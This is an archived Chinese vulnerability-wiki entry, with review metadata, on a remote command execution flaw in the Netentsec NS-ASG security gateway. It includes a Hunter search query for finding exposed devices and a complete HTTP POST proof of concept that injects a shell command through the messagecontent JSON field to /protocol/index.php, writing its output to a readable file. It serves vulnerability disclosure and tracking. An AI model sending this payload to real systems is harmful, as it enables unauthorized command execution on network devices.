---
source: "wy876 漏洞文库"
id: "vw-85caa238d695df00b96b9df5"
entity_id: "ve-85caa238d695df00b96b9df5"
schema_version: "1"
title: "网康 NS-ASG应用安全网关存在远程命令执行漏洞"
product: "网康Netentsec NS-ASG"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无认证头，写当前protocol目录，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%BD%91%E5%BA%B7NS-ASG%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zut666gci4d1s4sv"
source_status: "recorded"
previous_fofa_unverified: "web.title=="
hunter: "web.title==\"网康 NS-ASG 应用安全网关\""
---

# 网康 NS-ASG应用安全网关存在远程命令执行漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：网康Netentsec NS-ASG
- 本文讨论：protocol/index.php getsysdatetime messagecontent注入
- 版本、权限与配置前提：无认证头，写当前protocol目录，版本未知
- 资料类型：JSON命令注入请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 无返回/文件输出证据，获取服务器权限声明待核
- 产品与下一代防火墙router不同，不能按同厂RCE合并；FOFA元数据错标Hunter
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 匿名条件、工作目录及修复构建待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
网康科技有限公司是中国技术领先的网络应用管理设备提供商，专注于网络应用管理领域最前沿的趋势研究和分析，为用户提供先进的网络应用管理技术、产品与解决方案，旨在帮助用户实现“上好网 用好网”的网络管理目标。网康应用安全网关系统存在远程命令执行漏洞，攻击者通过漏洞可以执行任意命令，导致服务器失陷。

# 二、影响版本
+ 网康应用安全网关系统

# 三、资产测绘
+ hunter`web.title=="网康 NS-ASG 应用安全网关"`
+ 特征


# 四、漏洞复现
1. 执行如下执行POC语句，同时执行id命令并写入/protocol/1.txt。

```http
POST /protocol/index.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>1.txt;"}
```


2. 访问`/protocol/1.txt`路径，获取命令执行结果。

```plain
/protocol/1.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zut666gci4d1s4sv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
